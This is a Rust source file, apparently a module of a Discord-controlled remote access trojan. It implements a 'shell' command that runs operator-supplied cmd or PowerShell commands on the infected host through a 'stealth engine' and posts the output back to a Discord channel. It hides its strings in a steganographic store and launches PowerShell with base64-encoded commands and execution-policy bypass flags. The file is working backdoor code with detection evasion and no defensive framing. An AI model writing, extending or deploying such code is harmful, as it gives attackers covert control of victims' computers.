use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::os::windows::process::CommandExt;
use std::process::{Command, Stdio};
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct ShellCommand;

impl ShellCommand {
    fn m(key: &str) -> String { StegoStore::get(StringCategory::Msg, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
    fn s(key: &str) -> String { StegoStore::get(StringCategory::Const, key) }
    fn w(key: &str) -> String { StegoStore::get(StringCategory::Win, key) }
}

#[async_trait]
impl BotCommand for ShellCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("SHELL_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "SHELL").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_CORE").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("SHELL_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".shell cmd dir", ".shell cmd whoami", ".shell ps Get-Process", ".shell ps Get-Location"].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("SHELL_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("SHELL_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let shell_type = args.next().unwrap_or("").to_lowercase();
        let command_str = args.rest();
        let command = command_str.trim();

        if shell_type.is_empty() || command.is_empty() {
            http.create_message(msg.channel_id.get(), &Self::m("ERR_SHELL_ARGS")).await?;
            return Ok(());
        }

        let output = match shell_type.as_str() {
            "cmd" => self.execute_cmd(command).await,
            "ps" | "powershell" => self.execute_powershell(command).await,
            _ => {
                http.create_message(msg.channel_id.get(), &Self::m("ERR_SHELL_TYPE")).await?;
                return Ok(());
            }
        };

        match output {
            Ok(result) => {
                let formatted_output = format!("```\n{}\n```", result);

                // Discord has a 2000 character limit
                if formatted_output.len() > 1900 {
                    let truncated = if result.len() > 1850 { &result[..1850] } else { &result };
                    http.create_message(msg.channel_id.get(), &format!("```\n{}\n...\n[Output truncated]\n```", truncated)).await?;
                } else {
                    http.create_message(msg.channel_id.get(), &formatted_output).await?;
                }
            }
            Err(e) => {
                http.create_message(msg.channel_id.get(), &format!("{}: {}", Self::m("ERR_SHELL_FAIL"), e)).await?;
            }
        }

        Ok(())
    }
}

impl ShellCommand {
    async fn execute_cmd(&self, command: &str) -> Result<String> {
        if let Some(engine) = crate::stealth::get_engine() {
            engine.execute_stealth_cmd_with_output(command)
        } else {
            Err(anyhow::anyhow!("Stealth engine not initialized"))
        }
    }

    async fn execute_powershell(&self, command: &str) -> Result<String> {
        if let Some(engine) = crate::stealth::get_engine() {
            let mut utf16: Vec<u16> = command.encode_utf16().collect();
            let utf8_bytes = unsafe { std::slice::from_raw_parts(utf16.as_ptr() as *const u8, utf16.len() * 2) };
            use base64::Engine;
            let b64 = base64::engine::general_purpose::STANDARD.encode(utf8_bytes);
            
            let ps_cmd = format!("powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -EncodedCommand {}", b64);
            
            engine.execute_stealth_cmd_with_output(&ps_cmd)
        } else {
            Err(anyhow::anyhow!("Stealth engine not initialized"))
        }
    }
}

